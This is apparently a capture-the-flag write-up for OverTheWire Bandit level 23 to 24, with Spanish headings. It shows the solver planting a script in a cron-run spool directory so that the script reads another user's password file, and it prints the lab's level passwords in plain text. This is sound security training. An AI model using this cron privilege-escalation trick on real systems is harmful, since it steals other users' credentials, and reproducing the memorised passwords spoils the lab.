# Bandit Level 23 → Level 24

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso al nivel
```
bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
```
## Solución
 ```bash
 bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit23       e2scrub_all
cronjob_bandit17_root  cronjob_bandit24       otw-tmp-dir
cronjob_bandit22       cronjob_bandit25_root  sysstat
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
bandit23@bandit:/tmp$ mkdir /tmp/kd
bandit23@bandit:/tmp$ cd kd
bandit23@bandit:/tmp/kd$ echo "cat /etc/bandit_pass/bandit24 >
/tmp/kd/password" > script.sh
bandit23@bandit:/tmp/kd$ cat script.sh
cat /etc/bandit_pass/bandit24 >
/tmp/kd/password
bandit23@bandit:/tmp/kd$ chmod +x script.sh
bandit23@bandit:/tmp/kd$ touch password
bandit23@bandit:/tmp/kd$ chmod 666 password
bandit23@bandit:/tmp/kd$ ls -la
total 10568
drwxrwxr-x   2 bandit23 bandit23     4096 Sep 18 16:25 .
drwxrwx-wt 171 root     root     10801152 Sep 18 16:58 ..
-rw-rw-rw-   1 bandit23 bandit23        0 Sep 18 16:58 password
-rwxrwxr-x   1 bandit23 bandit23       49 Sep 18 16:57 script.sh
bandit23@bandit:/tmp/kd$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kd$ ls -la
total 10568
drwxrwxr-x   2 bandit23 bandit23     4096 Sep 18 16:25 .
drwxrwx-wt 172 root     root     10801152 Sep 18 16:58 ..
-rw-rw-rw-   1 bandit23 bandit23        0 Sep 18 16:58 password
-rwxrwxr-x   1 bandit23 bandit23       49 Sep 18 16:57 script.sh
bandit23@bandit:/tmp/kd$ date
Mon Sep 18 04:58:35 PM UTC 2023
bandit23@bandit:/tmp/kd$ ls -la
total 10568
drwxrwxr-x   2 bandit23 bandit23     4096 Sep 18 16:25 .
drwxrwx-wt 172 root     root     10801152 Sep 18 16:58 ..
-rw-rw-rw-   1 bandit23 bandit23       33 Sep 18 16:58 password
-rwxrwxr-x   1 bandit23 bandit23       49 Sep 18 16:57 script.sh
bandit23@bandit:/tmp/kd$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
``` 
## Notas adicionales
En este caso también tenemos un script, vamos a emularlo desde bandit23.
## Referencias
